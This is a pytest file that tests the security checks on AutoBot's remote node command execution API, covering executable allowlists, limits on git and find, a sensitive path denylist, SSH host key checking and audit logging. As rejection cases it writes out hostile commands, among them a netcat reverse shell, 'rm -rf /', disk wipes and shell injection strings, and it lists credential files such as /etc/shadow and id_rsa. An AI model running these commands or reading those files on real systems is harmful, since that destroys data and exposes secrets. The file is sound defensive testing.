# AutoBot - AI-Powered Automation Platform
# Copyright (c) 2025 mrveiss
# Author: mrveiss
"""
Tests for Node Remote Execution API security (#3421).

Security model being tested:
- _validate_command() tokenises with shlex.split() and checks the first token
  (executable name) against ALLOWED_EXECUTABLES.
- _run_command() and _run_via_ssh() receive the already-split token list and
  execute with shell=False — so shell metacharacters in arguments are inert.
- The defence-in-depth is the combination of allowlist-on-first-token PLUS
  shell=False token passing.  A command like "ls; bash" is safe because:
    a) shlex.split produces ["ls", ";", "bash"] — first token "ls" is allowed
    b) subprocess_exec receives ["ls", ";", "bash"] with shell=False — the OS
       passes ";", "bash" as literal arguments to ls, bash never executes.
- Commands whose first token is not in the allowlist are rejected at HTTP 400.
- Unmatched quotes cause shlex.ValueError → HTTP 400.

Covers:
- Permitted executables pass validation.
- Executables not in the allowlist are rejected.
- Unmatched-quote parse errors are rejected.
- Empty / whitespace-only commands are rejected.
- Absolute-path prefixes (e.g. /bin/bash) are stripped for the allowlist check.
- Audit logging records command and acting user.
- SSH uses known_hosts (StrictHostKeyChecking=yes or accept-new), never =no.
"""

import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException

# ---------------------------------------------------------------------------
# Path setup — allow importing without full app initialisation
# ---------------------------------------------------------------------------

_backend_root = Path(__file__).parent.parent
sys.path.insert(0, str(_backend_root))

# Stub heavy dependencies before importing the module under test.
_models_stub = MagicMock()
_models_stub.EventSeverity = MagicMock()
_models_stub.EventType = MagicMock()
_models_stub.Node = MagicMock()
_models_stub.NodeEvent = MagicMock()
_models_stub.NodeStatus = MagicMock()
sys.modules.setdefault("models.database", _models_stub)
sys.modules.setdefault("services.auth", MagicMock())
sys.modules.setdefault("services.database", MagicMock())
sys.modules.setdefault("sqlalchemy", MagicMock())
sys.modules.setdefault("sqlalchemy.ext.asyncio", MagicMock())

import importlib.util  # noqa: E402

_spec = importlib.util.spec_from_file_location("nodes_execution", Path(__file__).parent / "nodes_execution.py")
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)

_validate_command = _mod._validate_command
_validate_git_subcommand = _mod._validate_git_subcommand
_validate_find_args = _mod._validate_find_args
_check_sensitive_path = _mod._check_sensitive_path
ALLOWED_EXECUTABLES = _mod.ALLOWED_EXECUTABLES
_GIT_ALLOWED_SUBCOMMANDS = _mod._GIT_ALLOWED_SUBCOMMANDS
_GIT_STASH_ALLOWED_OPS = _mod._GIT_STASH_ALLOWED_OPS
_FIND_BLOCKED_FLAGS = _mod._FIND_BLOCKED_FLAGS
_FILE_READ_EXECUTABLES = _mod._FILE_READ_EXECUTABLES
_is_local_ip = _mod._is_local_ip
_run_command = _mod._run_command
_run_via_ssh = _mod._run_via_ssh
_SSH_SYSTEM_KNOWN_HOSTS_PATH = _mod._SSH_SYSTEM_KNOWN_HOSTS_PATH
_audit_execute_event = _mod._audit_execute_event
NodeExecuteRequest = _mod.NodeExecuteRequest


# ---------------------------------------------------------------------------
# _validate_command — allowlist enforcement
# ---------------------------------------------------------------------------


class TestValidateCommandAllowlist:
    """Permitted executables pass validation."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "systemctl status autobot-backend",
            "journalctl -u autobot-backend --no-pager -n 50",
            "df -h",
            "ps aux",
            "free -m",
            "uptime",
            "ls /var/log",
            "cat /var/log/autobot.log",
            "ip addr show",
            "ss -tlnp",
            "git status",
            "/usr/bin/systemctl status nginx",  # absolute path — name extracted
            "/bin/ls -la",  # absolute path to allowed executable
        ],
    )
    def test_allowed_commands_pass(self, cmd):
        """No exception is raised for commands on the allowlist."""
        executable = _validate_command(cmd)
        assert executable in ALLOWED_EXECUTABLES

    @pytest.mark.parametrize(
        "cmd",
        [
            "bash -c 'id'",
            "sh -c whoami",
            "python3 -c 'import os; os.system(\"id\")'",
            "python -c print(1)",
            "perl -e 'print 1'",
            "ruby -e 'puts 1'",
            "node -e 'console.log(1)'",
            "nc -e /bin/bash 10.0.0.1 4444",
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda",
            "passwd root",
            "adduser hacker",
            "visudo",
            "crontab -e",
            "at now",
            "eval $(cat /etc/passwd)",
            "exec bash",
            # Absolute-path disallowed executables are also blocked
            "/bin/bash -c id",
            "/usr/bin/python3 -c 'pass'",
            "/usr/bin/perl -e 1",
        ],
    )
    def test_disallowed_executables_rejected(self, cmd):
        """Commands not on the allowlist are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400
        assert "not permitted" in exc_info.value.detail

    @pytest.mark.parametrize(
        "cmd",
        [
            # Unmatched quotes cause shlex.split() to raise ValueError
            "ls 'unterminated",
            'cat "open string',
            "systemctl status 'nginx",
        ],
    )
    def test_shlex_parse_error_rejected(self, cmd):
        """Commands that cannot be parsed by shlex are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400
        assert "parse" in exc_info.value.detail

    def test_empty_command_rejected(self):
        """Commands that tokenise to an empty list are rejected."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("   ")
        assert exc_info.value.status_code == 400

    def test_whitespace_only_rejected(self):
        """Whitespace-only strings tokenise to an empty list and are rejected."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("\t\n  ")
        assert exc_info.value.status_code == 400

    def test_absolute_path_disallowed_rejected(self):
        """/bin/bash is rejected even though /bin/ls would pass."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("/bin/bash -i")
        assert exc_info.value.status_code == 400

    def test_absolute_path_allowed_passes(self):
        """/usr/bin/systemctl passes because 'systemctl' is in the allowlist."""
        executable = _validate_command("/usr/bin/systemctl status nginx")
        assert executable == "systemctl"

    def test_returns_executable_name(self):
        """_validate_command returns the extracted executable name."""
        assert _validate_command("df -h") == "df"
        assert _validate_command("systemctl status nginx") == "systemctl"


class TestValidateCommandGitSubcommands:
    """Git-specific subcommand allowlist enforcement (#3478)."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "git status",
            "git log --oneline -10",
            "git diff HEAD",
            "git show HEAD",
            "git branch -a",
            "git remote -v",
            "git tag",
            "git describe --tags",
            "git rev-parse HEAD",
            "git ls-files",
            "git stash list",
            "git stash show",
        ],
    )
    def test_allowed_git_commands_pass(self, cmd):
        """Permitted git subcommands pass validation."""
        executable = _validate_command(cmd)
        assert executable == "git"

    def test_bare_git_stash_rejected(self):
        """Bare 'git stash' with no operation is rejected with HTTP 400 (#3478)."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("git stash")
        assert exc_info.value.status_code == 400
        assert "stash" in exc_info.value.detail

    @pytest.mark.parametrize(
        "cmd",
        [
            "git stash push",
            "git stash pop",
            "git stash apply",
            "git stash drop",
            "git stash clear",
            "git stash branch my-branch",
        ],
    )
    def test_disallowed_git_stash_operations_rejected(self, cmd):
        """Mutating git stash operations are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400

    @pytest.mark.parametrize(
        "cmd",
        [
            "git checkout main",
            "git reset --hard HEAD",
            "git push origin main",
            "git pull",
            "git fetch",
            "git merge main",
            "git rebase main",
            "git commit -m 'msg'",
            "git add .",
            "git rm file.txt",
            "git clean -fd",
            "git config user.email x@x.com",
        ],
    )
    def test_disallowed_git_subcommands_rejected(self, cmd):
        """Git subcommands not in the allowlist are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400

    def test_bare_git_no_subcommand_rejected(self):
        """Bare 'git' with no subcommand is rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("git")
        assert exc_info.value.status_code == 400
        assert "subcommand" in exc_info.value.detail

    def test_git_stash_list_passes(self):
        """'git stash list' is explicitly allowed as a read-only operation."""
        executable = _validate_command("git stash list")
        assert executable == "git"

    def test_git_stash_show_passes(self):
        """'git stash show' is explicitly allowed as a read-only operation."""
        executable = _validate_command("git stash show")
        assert executable == "git"


class TestValidateCommandFindArgs:
    """find destructive/exec flag enforcement (#3474)."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "find /var/log -name '*.log'",
            "find /etc -type f",
            "find . -name '*.conf' -type f",
            "find /tmp -maxdepth 2 -mtime +7",
            "find /var -name '*.key' -readable",
            "find / -name 'autobot' -print",
        ],
    )
    def test_allowed_find_commands_pass(self, cmd):
        """Read-only find invocations pass validation."""
        executable = _validate_command(cmd)
        assert executable == "find"

    @pytest.mark.parametrize(
        "cmd",
        [
            "find /tmp -name '*.log' -delete",
            "find /etc -name '*.conf' -fprint /tmp/out.txt",
            "find /var -name '*.key' -fprint0 /tmp/keys.txt",
            "find /var -name '*.key' -fprintf /tmp/keys.txt '%p\\n'",
            "find /tmp -exec rm {} \\;",
            "find /tmp -exec rm {} +",
            "find /tmp -execdir rm {} \\;",
            "find /tmp -ok rm {} \\;",
            "find /tmp -okdir rm {} \\;",
        ],
    )
    def test_destructive_find_flags_rejected(self, cmd):
        """find invocations with destructive or exec flags are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400
        assert "not permitted" in exc_info.value.detail

    def test_find_delete_error_message_names_flag(self):
        """-delete is named in the rejection message."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("find /tmp -name '*.log' -delete")
        assert "-delete" in exc_info.value.detail

    def test_find_exec_error_message_names_flag(self):
        """-exec is named in the rejection message."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("find /tmp -exec rm {} \\;")
        assert "-exec" in exc_info.value.detail

    def test_validate_find_args_directly_blocked(self):
        """_validate_find_args raises HTTP 400 for blocked flags when called directly."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_find_args(
                ["find", "/tmp", "-delete"]
            )  # nosec B108 - test/controlled code uses tmpdir intentionally
        assert exc_info.value.status_code == 400

    def test_validate_find_args_directly_allowed(self):
        """_validate_find_args does not raise for read-only invocations."""
        _validate_find_args(["find", "/etc", "-name", "*.conf", "-type", "f"])

    def test_all_blocked_flags_are_actually_blocked(self):
        """Every flag in _FIND_BLOCKED_FLAGS is rejected by _validate_command."""
        for flag in _FIND_BLOCKED_FLAGS:
            cmd = f"find /tmp {flag} extra_arg"
            with pytest.raises(HTTPException) as exc_info:
                _validate_command(cmd)
            assert exc_info.value.status_code == 400, f"Expected HTTP 400 for find with flag {flag!r}"


class TestShellMetacharactersAreInertWithShellFalse:
    """
    Shell metacharacters (;, &&, ||, newlines) in allowed commands are NOT
    rejected by _validate_command because shlex.split() treats them as normal
    argument characters in POSIX mode.

    The injection is neutralised by shell=False in _run_command/_run_via_ssh:
    the tokens are passed directly to execve(), so the OS treats ; as a literal
    argument to the first executable.  bash/rm/etc. never execute.

    These test cases document this deliberate design: validation passes, but
    the tokens produced by shlex confirm no shell injection can occur at the
    exec layer.
    """

    @pytest.mark.parametrize(
        "cmd, expected_first_token",
        [
            # shlex keeps ';' attached to the preceding argument
            ("ls /tmp; rm -rf /", "ls"),
            # shlex treats && as two tokens: '&&' and the next word
            ("df -h && bash", "df"),
            # shlex splits on spaces but ; is treated as part of /tmp;
            ("cat /var/log/autobot.log; bash", "cat"),
        ],
    )
    def test_metachar_cmds_pass_validation_but_shell_is_false(self, cmd, expected_first_token):
        """_validate_command returns the executable; shell=False makes the rest inert."""
        executable = _validate_command(cmd)
        assert executable == expected_first_token

        # Confirm the second-command token is NOT a valid standalone executable
        # when shell=False is used (it becomes an argument to the first command).
        import shlex as _shlex

        tokens = _shlex.split(cmd)
        # With shell=False the OS receives exactly these tokens — semicolons and
        # subsequent words are passed as arguments, never interpreted as commands.
        assert tokens[0] == expected_first_token


# ---------------------------------------------------------------------------
# _check_sensitive_path — path denylist for cat/head/tail (#3475)
# ---------------------------------------------------------------------------


class TestCheckSensitivePath:
    """cat/head/tail must not be allowed to read sensitive file paths."""

    # --- sensitive paths that must be blocked ---

    @pytest.mark.parametrize(
        "cmd",
        [
            # /etc/ prefix — credentials, shadow, sudoers, ssh server keys, etc.
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /etc/sudoers",
            "head /etc/os-release",
            "tail /etc/hosts",
            "cat /etc/ssh/sshd_config",
            # /root/ — root home directory
            "cat /root/.bashrc",
            "head /root/secret.txt",
            # /home/ — user home dirs contain .ssh, .env, credentials
            "cat /home/autobot/.bashrc",
            "tail /home/ubuntu/.ssh/authorized_keys",
            # /proc/ and /sys/ — kernel/process info leaks
            "cat /proc/1/environ",
            "head /sys/kernel/security/lsm",
            # /var/lib/ — databases, docker volumes, etc.
            "cat /var/lib/docker/volumes/mydata/_data/db.sqlite",
            # Sensitive filename patterns — any directory
            "cat /opt/autobot/config.env",
            "head /tmp/deploy.key",
            "tail /srv/certs/server.pem",
            "cat /tmp/id_rsa",
            "head /tmp/authorized_keys",
            "cat /opt/app/.htpasswd",
            "tail /home/user/.netrc",
            # Path traversal attempts normalised to sensitive prefix
            "cat /opt/../etc/passwd",
            "head /var/log/../../etc/shadow",
        ],
    )
    def test_sensitive_paths_rejected(self, cmd):
        """cat/head/tail targeting sensitive paths/filenames are rejected with HTTP 400."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command(cmd)
        assert exc_info.value.status_code == 400
        assert "restricted" in exc_info.value.detail

    # --- safe paths that must be allowed ---

    @pytest.mark.parametrize(
        "cmd",
        [
            # AutoBot log files — primary legitimate use
            "cat /var/log/autobot.log",
            "head /var/log/autobot-backend.log",
            "tail /var/log/syslog",
            "tail -n 100 /var/log/nginx/access.log",
            # /tmp — transient scratch files
            "cat /tmp/autobot_output.txt",
            "head /tmp/result.json",
            # /opt/autobot — autobot application files (non-secret)
            "cat /opt/autobot/version.txt",
            # Flags only — no path argument
            "cat --help",
            "head -n 10",
        ],
    )
    def test_safe_paths_allowed(self, cmd):
        """cat/head/tail targeting safe paths are not rejected by path check."""
        # Should not raise for the path check (may still raise for other reasons
        # but the important thing is _check_sensitive_path does not block these)
        executable = _validate_command(cmd)
        assert executable in _FILE_READ_EXECUTABLES

    # --- non-file-read executables are unaffected ---

    def test_non_file_read_executables_skip_path_check(self):
        """ls, df, ps etc. bypass _check_sensitive_path entirely."""
        # ls /etc is fine — it only lists, doesn't read content
        executable = _validate_command("ls /etc")
        assert executable == "ls"

    def test_path_traversal_into_etc_blocked(self):
        """Path traversal via ../ that resolves to /etc is blocked."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("cat /var/log/../../etc/shadow")
        assert exc_info.value.status_code == 400
        assert "restricted" in exc_info.value.detail

    def test_bare_etc_directory_blocked(self):
        """cat /etc (without trailing slash) is blocked."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("cat /etc")
        assert exc_info.value.status_code == 400

    def test_relative_path_rejected(self):
        """Relative paths bypass the prefix denylist and are always rejected."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("cat etc/passwd")
        assert exc_info.value.status_code == 400
        assert "absolute" in exc_info.value.detail

    def test_relative_dotdot_rejected(self):
        """Relative ../traversal paths are rejected before normalisation."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("cat ../../etc/shadow")
        assert exc_info.value.status_code == 400
        assert "absolute" in exc_info.value.detail

    def test_env_file_in_any_directory_blocked(self):
        """A .env file under any directory is blocked by filename rule."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("cat /opt/myapp/.env")
        assert exc_info.value.status_code == 400
        assert "restricted" in exc_info.value.detail

    def test_key_file_in_tmp_blocked(self):
        """A .key file even under /tmp is blocked by filename rule."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_command("head /tmp/server.key")
        assert exc_info.value.status_code == 400


# ---------------------------------------------------------------------------
# NodeExecuteRequest schema validation
# ---------------------------------------------------------------------------


class TestNodeExecuteRequestSchema:
    def test_max_length_enforced(self):
        """Command longer than 4096 chars is rejected by the schema."""
        with pytest.raises(Exception):
            NodeExecuteRequest(command="x" * 4097)

    def test_min_length_enforced(self):
        """Empty command is rejected by the schema."""
        with pytest.raises(Exception):
            NodeExecuteRequest(command="")

    def test_valid_command_accepted(self):
        """A valid command within length limits is accepted."""
        req = NodeExecuteRequest(command="systemctl status nginx")
        assert req.command == "systemctl status nginx"

    def test_default_timeout(self):
        """Default timeout is 300 seconds."""
        req = NodeExecuteRequest(command="df -h")
        assert req.timeout == 300


# ---------------------------------------------------------------------------
# _is_local_ip
# ---------------------------------------------------------------------------


class TestIsLocalIp:
    def test_loopback_is_local(self):
        assert _is_local_ip("127.0.0.1") is True
        assert _is_local_ip("::1") is True
        assert _is_local_ip("localhost") is True

    def test_remote_is_not_local(self):
        assert _is_local_ip("10.0.0.99") is False
        assert _is_local_ip("192.168.1.1") is False


# ---------------------------------------------------------------------------
# _run_via_ssh — known_hosts flag (StrictHostKeyChecking=no must not appear)
# ---------------------------------------------------------------------------


class TestRunViaSshKnownHosts:
    """Verify SSH is called with known_hosts checking, not StrictHostKeyChecking=no."""

    @pytest.mark.asyncio
    async def test_uses_strict_host_key_checking_when_known_hosts_exists(self, tmp_path):
        """When known_hosts file exists, StrictHostKeyChecking=yes is passed."""
        known_hosts = tmp_path / "known_hosts"
        known_hosts.write_text("10.0.0.1 ssh-rsa AAAA...", encoding="utf-8")

        captured_cmd: list[str] = []

        async def fake_exec(*args, **kwargs):
            captured_cmd.extend(args)
            proc = MagicMock()
            proc.communicate = AsyncMock(return_value=(b"ok", b""))
            proc.returncode = 0
            proc.kill = MagicMock()
            return proc

        with (
            patch.object(_mod, "_SSH_KNOWN_HOSTS_PATH", str(known_hosts)),
            patch.object(_mod, "_SSH_KEY_PATH", "/nonexistent/key"),
            patch("asyncio.create_subprocess_exec", side_effect=fake_exec),
        ):
            await _run_via_ssh("10.0.0.1", "autobot", 22, ["systemctl", "status", "nginx"], 10)

        ssh_opts = " ".join(captured_cmd)
        assert "StrictHostKeyChecking=yes" in ssh_opts, f"Expected StrictHostKeyChecking=yes in: {ssh_opts}"
        assert "StrictHostKeyChecking=no" not in ssh_opts

    @pytest.mark.asyncio
    async def test_falls_back_to_system_known_hosts_when_user_file_absent(self, tmp_path):
        """Falls back to system known_hosts when per-user file is absent (#3469)."""
        missing_user_path = str(tmp_path / "nonexistent_known_hosts")
        system_known_hosts = tmp_path / "ssh_known_hosts"
        system_known_hosts.write_text("10.0.0.2 ssh-rsa AAAA...", encoding="utf-8")

        captured_cmd: list[str] = []

        async def fake_exec(*args, **kwargs):
            captured_cmd.extend(args)
            proc = MagicMock()
            proc.communicate = AsyncMock(return_value=(b"ok", b""))
            proc.returncode = 0
            proc.kill = MagicMock()
            return proc

        with (
            patch.object(_mod, "_SSH_KNOWN_HOSTS_PATH", missing_user_path),
            patch.object(_mod, "_SSH_SYSTEM_KNOWN_HOSTS_PATH", str(system_known_hosts)),
            patch.object(_mod, "_SSH_KEY_PATH", "/nonexistent/key"),
            patch("asyncio.create_subprocess_exec", side_effect=fake_exec),
        ):
            await _run_via_ssh("10.0.0.2", "autobot", 22, ["df", "-h"], 10)

        ssh_opts = " ".join(captured_cmd)
        assert "StrictHostKeyChecking=yes" in ssh_opts, f"Expected strict checking: {ssh_opts}"
        assert str(system_known_hosts) in ssh_opts, f"Expected system known_hosts: {ssh_opts}"
        assert "/dev/null" not in ssh_opts, "Must not use /dev/null as known_hosts"
        assert "accept-new" not in ssh_opts, "Must not use accept-new when file exists"

    @pytest.mark.asyncio
    async def test_refuses_connection_when_no_known_hosts_files_exist(self, tmp_path):
        """Raises HTTP 503 when neither per-user nor system known_hosts file exists (#3469)."""
        missing_user_path = str(tmp_path / "nonexistent_user_known_hosts")
        missing_system_path = str(tmp_path / "nonexistent_system_known_hosts")

        with (
            patch.object(_mod, "_SSH_KNOWN_HOSTS_PATH", missing_user_path),
            patch.object(_mod, "_SSH_SYSTEM_KNOWN_HOSTS_PATH", missing_system_path),
            patch.object(_mod, "_SSH_KEY_PATH", "/nonexistent/key"),
        ):
            with pytest.raises(HTTPException) as exc_info:
                await _run_via_ssh("10.0.0.2", "autobot", 22, ["df", "-h"], 10)

        assert exc_info.value.status_code == 503
        assert "known_hosts" in exc_info.value.detail
        assert "Ansible" in exc_info.value.detail

    @pytest.mark.asyncio
    async def test_tokens_passed_as_individual_args_not_shell_string(self, tmp_path):
        """SSH receives command tokens as individual arguments (shell=False equivalent).

        This verifies that shell injection through SSH arguments is impossible:
        the tokens are passed to SSH as separate argv entries, so the remote
        shell never sees a compound string to interpret.
        """
        known_hosts = tmp_path / "known_hosts"
        known_hosts.write_text("10.0.0.1 ssh-rsa AAAA...", encoding="utf-8")

        captured_args: list[str] = []

        async def fake_exec(*args, **kwargs):
            captured_args.extend(args)
            proc = MagicMock()
            proc.communicate = AsyncMock(return_value=(b"ok", b""))
            proc.returncode = 0
            proc.kill = MagicMock()
            return proc

        tokens = ["systemctl", "status", "nginx"]
        with (
            patch.object(_mod, "_SSH_KNOWN_HOSTS_PATH", str(known_hosts)),
            patch.object(_mod, "_SSH_KEY_PATH", "/nonexistent/key"),
            patch("asyncio.create_subprocess_exec", side_effect=fake_exec),
        ):
            await _run_via_ssh("10.0.0.1", "autobot", 22, tokens, 10)

        # The individual tokens must appear as separate items in the argument
        # list — NOT as a single concatenated string.
        for token in tokens:
            assert token in captured_args, f"Token {token!r} not found as individual arg in: {captured_args}"


# ---------------------------------------------------------------------------
# _audit_execute_event — records command and user identity
# ---------------------------------------------------------------------------


class TestAuditExecuteEvent:
    """Audit event must include command and acting_user in details."""

    @pytest.mark.asyncio
    async def test_audit_event_includes_command_and_user(self):
        """details dict contains 'command' and 'acting_user' keys."""
        recorded_events: list = []

        mock_db = AsyncMock()
        mock_db.add = lambda e: recorded_events.append(e)
        mock_db.commit = AsyncMock()

        class FakeNodeEvent:
            def __init__(self, **kwargs):
                self.__dict__.update(kwargs)

        with patch.object(_mod, "NodeEvent", FakeNodeEvent):
            await _audit_execute_event(
                db=mock_db,
                node_id="node-1",
                job_id="job-abc",
                command="systemctl status nginx",
                acting_user="alice",
                exit_code=0,
                duration_ms=42,
                severity=_mod.EventSeverity.INFO,
            )

        assert len(recorded_events) == 1
        event = recorded_events[0]
        assert event.details["command"] == "systemctl status nginx"
        assert event.details["acting_user"] == "alice"
        assert event.details["exit_code"] == 0
        assert event.details["job_id"] == "job-abc"
        assert "alice" in event.message
        assert "job-abc" in event.message

    @pytest.mark.asyncio
    async def test_audit_event_truncates_long_command_in_message(self):
        """Long commands are truncated in the message but stored in full in details."""
        recorded_events: list = []

        mock_db = AsyncMock()
        mock_db.add = lambda e: recorded_events.append(e)
        mock_db.commit = AsyncMock()

        class FakeNodeEvent:
            def __init__(self, **kwargs):
                self.__dict__.update(kwargs)

        long_cmd = "df " + "-h " * 60  # > 120 chars
        with patch.object(_mod, "NodeEvent", FakeNodeEvent):
            await _audit_execute_event(
                db=mock_db,
                node_id="node-1",
                job_id="job-xyz",
                command=long_cmd,
                acting_user="bob",
                exit_code=1,
                duration_ms=100,
                severity=_mod.EventSeverity.WARNING,
            )

        event = recorded_events[0]
        # Full command preserved in details
        assert event.details["command"] == long_cmd
        # Message contains truncation marker
        assert "..." in event.message
